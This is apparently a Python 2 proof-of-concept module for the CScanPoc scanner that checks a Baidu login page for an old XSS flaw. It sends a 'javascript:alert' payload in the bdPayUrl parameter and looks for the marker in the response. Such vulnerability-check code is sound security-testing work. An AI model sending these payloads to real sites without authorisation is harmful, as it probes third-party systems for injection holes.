# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Baidu_0123' # 平台漏洞编号
    name = '百度登录xss' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2012-09-12'  # 漏洞公布时间
    desc = '''模版漏洞描述
    百度登录url跳转漏洞，攻击者可以通过执行恶意脚本，从而导致的安全问题。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=10284
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Baidu'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'cc9987d8-25f2-4550-b1bc-370d26b10f66' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-20' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            targeturl = "/loginPage.html?type=1&bdPayUrl="
            payload = "loginPage.html?type=1&bdPayUrl=javascript:alert%28%22Cscan-hyhmnn%22%29;"+targeturl
            url = self.target + payload
            response = requests.get(url)
            if response.status_code==200 and "Cscan-hyhmnn" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
